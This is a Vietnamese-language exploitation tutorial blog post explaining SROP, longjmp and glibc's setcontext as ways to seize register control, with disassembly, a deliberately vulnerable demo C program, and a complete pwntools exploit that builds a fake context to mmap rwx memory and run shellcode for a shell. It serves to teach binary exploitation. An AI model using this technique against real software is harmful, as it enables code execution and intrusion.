---
title: "setcontext"
date: 2024-10-02 00:00:00 +0800
categories: [pwn]
tags: [technical]
author: "kuvee"
layout: post
toc: true 
---


## SROP 

- SigReturn Oriented Programming : là 1 kĩ thuật hữu ích cho phép attacker kiểm soát tất cả các thanh ghi , bao gồm cả pc and sp (RIP and RSP) , điều này giúp ta thiết lập các syscall dễ dàng hoặc stack pivot chẳn hạn , ta sẽ làm điều đó bằng cách
    - control rax -> SYS_rt_sigreturn/SYS_sigreturn
    - thiết lập SigreturnFrame trên stack
    - thực thi syscall 

- nó sẽ trông giống như sau : 

ngoài ra nếu không có gadget **rax** thay vào đó ta cũng có thể dùng các hàm như read , alarm ... giúp điều khiển **rax**

```css
|--------------------|
| pop rax ; ret      |
| ------------------ |
| SYS_rt_sigreturn   |
| ------------------ |
| syscall            |
| ------------------ |
|                    |
| SigreturnFrame     |
|                    |
| ------------------ |
```

file demo : [here](/assets/files/setcontext.rar)

```c
// gcc vuln.c -o vuln -fstack-protector -Wl,-z,relro,-z,now
#include <stdlib.h>
#include <stdio.h>

int main() {
	// libc leak
    printf("printf: %p\n", &printf);

	// controlled data
    void *ptr = malloc(0x400);
    printf("ptr: %p\n", ptr);
    fgets(ptr, 0x400, stdin);

	// function call primitive with controlled argument
    void (*func)(void*);
    scanf("%zu", (unsigned long*)&func);
    getchar();

    func(ptr);
}

```

- ở bài trên vì là 1 bài demo nên ta có sẵn 1 libc leak , tiếp theo là malloc(0x400) tạo 1 vùng heap + leak heap address , được input() vào chunk 0x400 bytes 
- ta cũng có 1 con trỏ hàm và đối số do ta kiểm soát , target đơn giản nhất sẽ là thực thi <span style="color:pink">system(/bin/sh)</span> , tuy nhiên không phải lúc nào cũng có thể lấy shell bằng cách này vì nếu xuất hiện **seccomp** ta phải đi theo 1 hướng khác 
- vậy 1 ý tưởng khác là ta sẽ dùng ROP hoặc shellcode orw , ta có thể dùng shellcode bằng cách **mmap** hoặc **mprotect** để tạo 1 vùng nhớ mới và thực thi nó 

## longjmp


longjmp is used for non-local gotos , về cơ bản là ta có thể nhảy giữa các điểm khác nhau trên các hàm khác nhau, nó sẽ hoạt động như sau: 

- dùng **setjmp* để lưu stack hiện tại vào 1 số buffer , chẳng hạn như các thanh ghi được sử dụng để lưu trữ các variable , RBP , RSP , RIP .  lần call đàu tiên sẽ trả về 0 để chỉ ra rằng nó đang lưu thông tin
- ở những nơi khác , có 1 cuộc gọi đến **longjmp** , nó sẽ tham chiếu đến buffer , điều này sẽ khôi phục tất cả các **reg** đã được lưu , bao gồm **RIP** , có nghĩa là ta có quyền control **RIP** mà **setjmp** trả về
- điều quan trọng là trong lần call đến **longjmp** , bạn cũng cần vượt qua 1 số giá trị bổ sung , nó được đưa vào **rax** để làm cho **setjmp** đã trả về cái gì đó . Giá trị này phải không khác biệt để phân biệt nó với cuộc gọi ban đầu đến SETJMP

```c
#include <setjmp.h>

jmp_buf env;

void some_func(void* data) {
    // This could be some function called when executing do_processing
    // And could be far down in the call stack
    ...
    if (some_error)
        longjmp(env, 69);
    ...
}

void do_processing(void* data) {
    /*
    Lots of complicated processing with many nested function calls
    */
    ...
}

void process_data(void* data) {
    int errno = setjmp(env);
    if (errno == 0) {
        ...
        do_processing(data);
        ...
    } else {
        printf("Error code %d found\n", errno);
    }
}
```

- ta sẽ cùng tìm hiểu sâu hơn , **setjmp** thực chất là 1 wrapped bao quanh **sigsetjmp**


![text](/assets/images/wrap.png)

- ta thấy ở đây **r12-r15** được giữ hiện trạng tuy nhiên **RBP , RSP , RIP** ( trước khi gọi tới setjmp bị biến dạng ) sử dụng (PTR_MANGLE) , sau đó được lưu vào bufer

**longjmp** : có 1 vài bước bổ sung , nó sẽ gọi 1 số hoạt động dọn dẹp mà ta sẽ không cần quan tâm

```cs
pwndbg> disass longjmp
Dump of assembler code for function __libc_siglongjmp:
   0x00007ffff7dd51f0 <+0>:     endbr64
   0x00007ffff7dd51f4 <+4>:     push   r12
   0x00007ffff7dd51f6 <+6>:     mov    r12,rdi
   0x00007ffff7dd51f9 <+9>:     push   rbp
   0x00007ffff7dd51fa <+10>:    mov    ebp,esi
   0x00007ffff7dd51fc <+12>:    sub    rsp,0x8
   0x00007ffff7dd5200 <+16>:    call   0x7ffff7dd5320 <_longjmp_unwind>
   0x00007ffff7dd5205 <+21>:    mov    eax,DWORD PTR [r12+0x40]
   0x00007ffff7dd520a <+26>:    test   eax,eax
   0x00007ffff7dd520c <+28>:    jne    0x7ffff7dd5222 <__libc_siglongjmp+50>
   0x00007ffff7dd520e <+30>:    test   ebp,ebp
   0x00007ffff7dd5210 <+32>:    mov    eax,0x1
   0x00007ffff7dd5215 <+37>:    mov    rdi,r12
   0x00007ffff7dd5218 <+40>:    cmove  ebp,eax
   0x00007ffff7dd521b <+43>:    mov    esi,ebp
   0x00007ffff7dd521d <+45>:    call   0x7ffff7dd5290 <__longjmp>
   0x00007ffff7dd5222 <+50>:    lea    rsi,[r12+0x48]
   0x00007ffff7dd5227 <+55>:    xor    edx,edx
   0x00007ffff7dd5229 <+57>:    mov    edi,0x2
   0x00007ffff7dd522e <+62>:    call   0x7ffff7dd5710 <__GI___sigprocmask>
   0x00007ffff7dd5233 <+67>:    jmp    0x7ffff7dd520e <__libc_siglongjmp+30>
```

- **__longjmp** : ta có thể bỏ qua 1 số đoạn (từ 67 -> 113)

```cs
pwndbg> disass __longjmp
Dump of assembler code for function __longjmp:
   0x00007ffff7dd5290 <+0>:     endbr64
   0x00007ffff7dd5294 <+4>:     mov    r8,QWORD PTR [rdi+0x30]
   0x00007ffff7dd5298 <+8>:     mov    r9,QWORD PTR [rdi+0x8]
   0x00007ffff7dd529c <+12>:    mov    rdx,QWORD PTR [rdi+0x38]
   0x00007ffff7dd52a0 <+16>:    ror    r8,0x11
   0x00007ffff7dd52a4 <+20>:    xor    r8,QWORD PTR fs:0x30
   0x00007ffff7dd52ad <+29>:    ror    r9,0x11
   0x00007ffff7dd52b1 <+33>:    xor    r9,QWORD PTR fs:0x30
   0x00007ffff7dd52ba <+42>:    ror    rdx,0x11
   0x00007ffff7dd52be <+46>:    xor    rdx,QWORD PTR fs:0x30
   0x00007ffff7dd52c7 <+55>:    test   DWORD PTR fs:0x48,0x2
   0x00007ffff7dd52d3 <+67>:    je     0x7ffff7dd5301 <__longjmp+113>
   0x00007ffff7dd52d5 <+69>:    rdsspq rax
   0x00007ffff7dd52da <+74>:    sub    rax,QWORD PTR [rdi+0x58]
   0x00007ffff7dd52de <+78>:    je     0x7ffff7dd5301 <__longjmp+113>
   0x00007ffff7dd52e0 <+80>:    neg    rax
   0x00007ffff7dd52e3 <+83>:    shr    rax,0x3
   0x00007ffff7dd52e7 <+87>:    add    rax,0x1
   0x00007ffff7dd52eb <+91>:    mov    ebx,0xff
   0x00007ffff7dd52f0 <+96>:    cmp    rax,rbx
   0x00007ffff7dd52f3 <+99>:    cmovb  rbx,rax
   0x00007ffff7dd52f7 <+103>:   incsspq rbx
   0x00007ffff7dd52fc <+108>:   sub    rax,rbx
   0x00007ffff7dd52ff <+111>:   ja     0x7ffff7dd52f0 <__longjmp+96>
   0x00007ffff7dd5301 <+113>:   nop
   0x00007ffff7dd5302 <+114>:   mov    rbx,QWORD PTR [rdi]
   0x00007ffff7dd5305 <+117>:   mov    r12,QWORD PTR [rdi+0x10]
   0x00007ffff7dd5309 <+121>:   mov    r13,QWORD PTR [rdi+0x18]
   0x00007ffff7dd530d <+125>:   mov    r14,QWORD PTR [rdi+0x20]
   0x00007ffff7dd5311 <+129>:   mov    r15,QWORD PTR [rdi+0x28]
   0x00007ffff7dd5315 <+133>:   mov    eax,esi
   0x00007ffff7dd5317 <+135>:   mov    rsp,r8
   0x00007ffff7dd531a <+138>:   mov    rbp,r9
   0x00007ffff7dd531d <+141>:   nop
   0x00007ffff7dd531e <+142>:   jmp    rdx
```

![text](/assets/images/longjmp.png)

- ta sẽ chú ý đoạn này 

```c
   0x00007ffff7dd5301 <+113>:   nop
   0x00007ffff7dd5302 <+114>:   mov    rbx,QWORD PTR [rdi]
   0x00007ffff7dd5305 <+117>:   mov    r12,QWORD PTR [rdi+0x10]
   0x00007ffff7dd5309 <+121>:   mov    r13,QWORD PTR [rdi+0x18]
   0x00007ffff7dd530d <+125>:   mov    r14,QWORD PTR [rdi+0x20]
   0x00007ffff7dd5311 <+129>:   mov    r15,QWORD PTR [rdi+0x28]
   0x00007ffff7dd5315 <+133>:   mov    eax,esi
   0x00007ffff7dd5317 <+135>:   mov    rsp,r8
   0x00007ffff7dd531a <+138>:   mov    rbp,r9
   0x00007ffff7dd531d <+141>:   nop
   0x00007ffff7dd531e <+142>:   jmp    rdx
```

kịch bản : ta thấy rõ ràng ở đây ta có thể control được các thanh ghi quan trọng (rbp,rsp,rip) , mặc dù ta không thể kiểm soát trực tiếp như SROP , nhưng nó đủ để tạo ra 1 chuỗi rop nhỏ để gọi 1 sigreturn syscall , ta có thể control rax bằng **longjmp** nếu ta có thể control rsi và trỏ rssp đến **SigreturnFrame**

- hạn chế chính là thực tế nó sử dụng **pointer mangling** ,  có nghĩa là ta cần leak/overwrite **the pointer guard fs:[0x30]** , đây có thể là 1 bước bổ sung trong 1 số trường hợp , nhưng nó có thể có nhiều vấn đề hơn trong trường hợp có các yếu tố nguyên thủy yếu hơn như bản demo này 


## setcontext

- setcontext cho phép chuyển đổi ngữ cảnh cấp người dùng, và cơ bản chỉ là sigreturn được triển khai thủ công trong glibc. Cách sử dụng tương tự như longjmp:

    - sử dụng **getcontext** để lưu thông tin của bối cảnh hiện tại , bao gồm hầu hết các thanh ghi và 1 số tín hiệu
    - sử dụng **setcontext** để trở về bối cảnh đã lưu trước đó , bắt đầu ngay sau khi call **getcontext** như mong đợi
  
- nó hoạt động thế nào? 

**setcontext** và **getcontext** được viết bằng asm , tuy nhiên nó cũng khá đơn giản : 


```cs
pwndbg> disass getcontext
Dump of assembler code for function getcontext:
   0x00007ffff7de6920 <+0>:     endbr64
   0x00007ffff7de6924 <+4>:     mov    QWORD PTR [rdi+0x80],rbx
   0x00007ffff7de692b <+11>:    mov    QWORD PTR [rdi+0x78],rbp
   0x00007ffff7de692f <+15>:    mov    QWORD PTR [rdi+0x48],r12
   0x00007ffff7de6933 <+19>:    mov    QWORD PTR [rdi+0x50],r13
   0x00007ffff7de6937 <+23>:    mov    QWORD PTR [rdi+0x58],r14
   0x00007ffff7de693b <+27>:    mov    QWORD PTR [rdi+0x60],r15
   0x00007ffff7de693f <+31>:    mov    QWORD PTR [rdi+0x68],rdi
   0x00007ffff7de6943 <+35>:    mov    QWORD PTR [rdi+0x70],rsi
   0x00007ffff7de6947 <+39>:    mov    QWORD PTR [rdi+0x88],rdx
   0x00007ffff7de694e <+46>:    mov    QWORD PTR [rdi+0x98],rcx
   0x00007ffff7de6955 <+53>:    mov    QWORD PTR [rdi+0x28],r8
   0x00007ffff7de6959 <+57>:    mov    QWORD PTR [rdi+0x30],r9
   0x00007ffff7de695d <+61>:    mov    rcx,QWORD PTR [rsp]
   0x00007ffff7de6961 <+65>:    mov    QWORD PTR [rdi+0xa8],rcx
   0x00007ffff7de6968 <+72>:    lea    rcx,[rsp+0x8]
   0x00007ffff7de696d <+77>:    mov    QWORD PTR [rdi+0xa0],rcx
   0x00007ffff7de6974 <+84>:    test   DWORD PTR fs:0x48,0x2
   0x00007ffff7de6980 <+96>:    je     0x7ffff7de69e0 <getcontext+192>
   0x00007ffff7de6982 <+98>:    mov    rdx,rdi
   0x00007ffff7de6985 <+101>:   xor    eax,eax
   0x00007ffff7de6987 <+103>:   cmp    rax,QWORD PTR fs:0x78
   0x00007ffff7de6990 <+112>:   jne    0x7ffff7de69c0 <getcontext+160>
   0x00007ffff7de6992 <+114>:   sub    rsp,0x18
   0x00007ffff7de6996 <+118>:   mov    rsi,rsp
   0x00007ffff7de6999 <+121>:   mov    edi,0x3001
   0x00007ffff7de699e <+126>:   mov    eax,0x9e
   0x00007ffff7de69a3 <+131>:   syscall
   0x00007ffff7de69a5 <+133>:   test   rax,rax
   0x00007ffff7de69a8 <+136>:   je     0x7ffff7de69ab <getcontext+139>
```

- **getcotext** chỉ là lưu các thanh ghi và arg , cộng với rsp và rip vào struct


```cs
pwndbg> disass setcontext
Dump of assembler code for function setcontext:
   0x00007ffff7de6a30 <+0>:     endbr64
   0x00007ffff7de6a34 <+4>:     push   rdi
   0x00007ffff7de6a35 <+5>:     lea    rsi,[rdi+0x128]
   0x00007ffff7de6a3c <+12>:    xor    edx,edx
   0x00007ffff7de6a3e <+14>:    mov    edi,0x2
   0x00007ffff7de6a43 <+19>:    mov    r10d,0x8
   0x00007ffff7de6a49 <+25>:    mov    eax,0xe
   0x00007ffff7de6a4e <+30>:    syscall
   0x00007ffff7de6a50 <+32>:    pop    rdx
   0x00007ffff7de6a51 <+33>:    cmp    rax,0xfffffffffffff001
   0x00007ffff7de6a57 <+39>:    jae    0x7ffff7de6b7f <setcontext+335>
   0x00007ffff7de6a5d <+45>:    mov    rcx,QWORD PTR [rdx+0xe0]
   0x00007ffff7de6a64 <+52>:    fldenv [rcx]
   0x00007ffff7de6a66 <+54>:    ldmxcsr DWORD PTR [rdx+0x1c0]
   0x00007ffff7de6a6d <+61>:    mov    rsp,QWORD PTR [rdx+0xa0]
   0x00007ffff7de6a74 <+68>:    mov    rbx,QWORD PTR [rdx+0x80]
   0x00007ffff7de6a7b <+75>:    mov    rbp,QWORD PTR [rdx+0x78]
   0x00007ffff7de6a7f <+79>:    mov    r12,QWORD PTR [rdx+0x48]
   0x00007ffff7de6a83 <+83>:    mov    r13,QWORD PTR [rdx+0x50]
   0x00007ffff7de6a87 <+87>:    mov    r14,QWORD PTR [rdx+0x58]
   0x00007ffff7de6a8b <+91>:    mov    r15,QWORD PTR [rdx+0x60]
   0x00007ffff7de6a8f <+95>:    test   DWORD PTR fs:0x48,0x2
   0x00007ffff7de6a9b <+107>:   je     0x7ffff7de6b56 <setcontext+294>
   0x00007ffff7de6aa1 <+113>:   mov    rsi,QWORD PTR [rdx+0x3a8]
   0x00007ffff7de6aa8 <+120>:   mov    rdi,rsi
   0x00007ffff7de6aab <+123>:   mov    rcx,QWORD PTR [rdx+0x3b0]
   0x00007ffff7de6ab2 <+130>:   cmp    rcx,QWORD PTR fs:0x78
   0x00007ffff7de6abb <+139>:   je     0x7ffff7de6af5 <setcontext+197>
   0x00007ffff7de6abd <+141>:   mov    rax,QWORD PTR [rsi-0x8]
   0x00007ffff7de6ac1 <+145>:   and    rax,0xfffffffffffffff8
   0x00007ffff7de6ac5 <+149>:   cmp    rax,rsi
   0x00007ffff7de6ac8 <+152>:   je     0x7ffff7de6ad0 <setcontext+160>
   0x00007ffff7de6aca <+154>:   sub    rsi,0x8
   0x00007ffff7de6ace <+158>:   jmp    0x7ffff7de6abd <setcontext+141>
   0x00007ffff7de6ad0 <+160>:   mov    rax,0x1
   0x00007ffff7de6ad7 <+167>:   incsspq rax
   0x00007ffff7de6adc <+172>:   rstorssp QWORD PTR [rsi-0x8]
   0x00007ffff7de6ae1 <+177>:   saveprevssp
   0x00007ffff7de6ae5 <+181>:   mov    rax,QWORD PTR [rdx+0x3b0]
   0x00007ffff7de6aec <+188>:   mov    QWORD PTR fs:0x78,rax
   0x00007ffff7de6af5 <+197>:   rdsspq rcx
   0x00007ffff7de6afa <+202>:   sub    rcx,rdi
   0x00007ffff7de6afd <+205>:   je     0x7ffff7de6b1c <setcontext+236>
   0x00007ffff7de6aff <+207>:   neg    rcx
   0x00007ffff7de6b02 <+210>:   shr    rcx,0x3
   0x00007ffff7de6b06 <+214>:   mov    esi,0xff
   0x00007ffff7de6b0b <+219>:   cmp    rcx,rsi
   0x00007ffff7de6b0e <+222>:   cmovb  rsi,rcx
   0x00007ffff7de6b12 <+226>:   incsspq rsi
   0x00007ffff7de6b17 <+231>:   sub    rcx,rsi
   0x00007ffff7de6b1a <+234>:   ja     0x7ffff7de6b0b <setcontext+219>
   0x00007ffff7de6b1c <+236>:   mov    rsi,QWORD PTR [rdx+0x70]
   0x00007ffff7de6b20 <+240>:   mov    rdi,QWORD PTR [rdx+0x68]
   0x00007ffff7de6b24 <+244>:   mov    rcx,QWORD PTR [rdx+0x98]
   0x00007ffff7de6b2b <+251>:   mov    r8,QWORD PTR [rdx+0x28]
   0x00007ffff7de6b2f <+255>:   mov    r9,QWORD PTR [rdx+0x30]
   0x00007ffff7de6b33 <+259>:   mov    r10,QWORD PTR [rdx+0xa8]
   0x00007ffff7de6b3a <+266>:   mov    rdx,QWORD PTR [rdx+0x88]
   0x00007ffff7de6b41 <+273>:   rdsspq rax
   0x00007ffff7de6b46 <+278>:   cmp    r10,QWORD PTR [rax]
   0x00007ffff7de6b49 <+281>:   mov    eax,0x0
   0x00007ffff7de6b4e <+286>:   jne    0x7ffff7de6b53 <setcontext+291>
   0x00007ffff7de6b50 <+288>:   push   r10
   0x00007ffff7de6b52 <+290>:   ret
   0x00007ffff7de6b53 <+291>:   jmp    r10
   0x00007ffff7de6b56 <+294>:   mov    rcx,QWORD PTR [rdx+0xa8]
   0x00007ffff7de6b5d <+301>:   push   rcx
   0x00007ffff7de6b5e <+302>:   mov    rsi,QWORD PTR [rdx+0x70]
   0x00007ffff7de6b62 <+306>:   mov    rdi,QWORD PTR [rdx+0x68]
   0x00007ffff7de6b66 <+310>:   mov    rcx,QWORD PTR [rdx+0x98]
   0x00007ffff7de6b6d <+317>:   mov    r8,QWORD PTR [rdx+0x28]
   0x00007ffff7de6b71 <+321>:   mov    r9,QWORD PTR [rdx+0x30]
   0x00007ffff7de6b75 <+325>:   mov    rdx,QWORD PTR [rdx+0x88]
   0x00007ffff7de6b7c <+332>:   xor    eax,eax
   0x00007ffff7de6b7e <+334>:   ret
   0x00007ffff7de6b7f <+335>:   mov    rcx,QWORD PTR [rip+0x1c528a]        # 0x7ffff7fabe10
   0x00007ffff7de6b86 <+342>:   neg    eax
   0x00007ffff7de6b88 <+344>:   mov    DWORD PTR fs:[rcx],eax
   0x00007ffff7de6b8b <+347>:   or     rax,0xffffffffffffffff
   0x00007ffff7de6b8f <+351>:   ret
```

- và **setcontext** chỉ cần khôi phục lại tất cả các thanh ghi đó 

### exploit

- không giống như **longjmp** , ta không cần bỏ qua bất kỳ thao tác con trỏ nào , vì vậy điều này lí tưởng cho cuộc tấn công , trong bản demo , ta sẽ nhắm đến việc thực thi shellcode , có thể thực hiện bằng cách thực hiện ROP:

1. sử dụng **mmap** tạo 1 vùng nhớ **rwx**
2. đọc vào shellcode của chúng ta
3. nhảy đến shellcode

- để tạo ra **ucontext_t** , ta vẫn có thể sử dụng **SigreturnFrame** , vì cơ bản của glibc ucontext_t về cơ bản giống với phiên bản của kernel (ít nhất là với các trường mà chúng ta quan tâm).

> Các cấu trúc có vẻ giống nhau cho đến cuối uc_mcontext(được bao phủ bởi SigreturnFrame), nhưng sau đó chúng hơi khác nhau, chủ yếu là do sự khác biệt trong thông tin tín hiệu được lưu trữ. Chúng ta thường không cần phải lo lắng về các trường này, và , cũng vậy SigreturnFrame, vì vậy nó hoạt động đủ tốt cho mục đích của chúng ta.

- không giống như SROP , ta cần chỉ định 1 con trỏ tới **fpstate** . khi **&fpstate** NULL , sigreturnsẽ bỏ qua fpstate, nhưng vì getcontextluôn điền vào trường này, setcontextcho rằng nó sẽ tồn tại và do đó nó sẽ bị sập ở đây.

```cs
0x00007ffff7de6a5d <+45>:    mov    rcx,QWORD PTR [rdx+0xe0]
   0x00007ffff7de6a64 <+52>:    fldenv [rcx]
   0x00007ffff7de6a66 <+54>:    ldmxcsr DWORD PTR [rdx+0x1c0]
```

- Bất kỳ con trỏ hợp lệ nào cũng có thể hoạt động, vì các trường trong đó fpstatecó thể không tạo ra sự khác biệt trong hầu hết các trường hợp, nhưng trong ví dụ này, tôi sẽ xây dựng nó như getcontextsau, nghĩa là nó sẽ trỏ tới ucontext+0x1a8:

- ta có thể xây dựng **fpsate** như sau : 

```
fpstate = {
    0x00: p16(0x37f),   # cwd
    0x02: p16(0xffff),  # swd
    0x04: p16(0x0),     # ftw
    0x06: p16(0xffff),  # fop
    0x08: 0xffffffff,   # rip
    0x10: 0x0,          # rdp
    0x18: 0x1f80,       # mxcsr (overlaps with ucontext+0x1c0)
    # 0x1c: mxcsr_mask
    # 0x20: _st[8] (0x10 bytes each)
    # 0xa0: _xmm[16] (0x10 bytes each)
    # 0x1a0: int reserved[24]
    # 0x200: [end]
}
```

kết hợp lại tất cả : 


```python
#!/usr/bin/python3
from pwn import *
from sys import argv

e = context.binary = ELF('vuln')
libc = ELF('libc', checksec=False)
ld = ELF('ld', checksec=False)
if len(argv) > 1:
	ip, port = argv[1].split(":")
	conn = lambda: remote(ip, port)
else:
	conn = lambda: e.process()

p = conn()

p.recvuntil(b"printf: ")
printf = int(p.recvline(), 16)
log.info(f"printf: {hex(printf)}")

libc.address = printf - libc.sym.printf
log.info(f"libc: {hex(libc.address)}")

p.recvuntil(b"ptr: ")
ptr = int(p.recvline(), 16)
log.info(f"ptr: {hex(ptr)}")

def setcontext(regs, addr):
	frame = SigreturnFrame()
	for reg, val in regs.items():
		setattr(frame, reg, val)
	# needed to prevent SEGFAULT
	setattr(frame, "&fpstate", addr+0x1a8)
	fpstate = {
	0x00: p16(0x37f),	# cwd
	0x02: p16(0xffff),	# swd
	0x04: p16(0x0),		# ftw
	0x06: p16(0xffff),	# fop
	0x08: 0xffffffff,	# rip
	0x10: 0x0,			# rdp
	0x18: 0x1f80,	    # mxcsr
	# 0x1c: mxcsr_mask
	# 0x20: _st[8] (0x10 bytes each)
	# 0xa0: _xmm[16] (0x10 bytes each)
	# 0x1a0: int reserved[24]
	# 0x200: [end]
	}
	return flat({
	0x00 : bytes(frame),
#	0xf8: 0					# end of SigreturnFrame
	0x128: 0,				# uc_sigmask
	0x1a8: fpstate,			# fpstate
	})

addr = 0xdead000
addr_rop = ptr + len(setcontext({}, 0))

data = setcontext({
	# mmap(addr, 0x1000, rwx, 0x22, -1, 0)
	"rip": libc.sym.mmap,
	"rdi": addr,
	"rsi": 0x1000,
	"rdx": 7,
	"rcx": 0x22,
	"r8": -1,
	"r9": 0,
	# execute rop afterwards
	"rsp": addr_rop
}, ptr)

rop = ROP(libc)
rop.gets(addr)
rop.raw(addr)

data += rop.chain()
#gdb.attach(p)
p.sendline(data)
p.sendline(str(libc.sym.setcontext).encode())

p.sendline(asm(shellcraft.linux.sh()))

p.interactive()
```


ref : 

[1](https://blog.wingszeng.top/pwn-glibc-setcontext/)
    
[2](https://surager.pub/_posts/2020-06-27-%E4%BB%8EDASCTF6%E6%9C%88%E8%B5%9B%E4%B8%AD%E5%AD%A6%E4%B9%A0setcontext%E7%BB%95%E8%BF%87seccomp/)

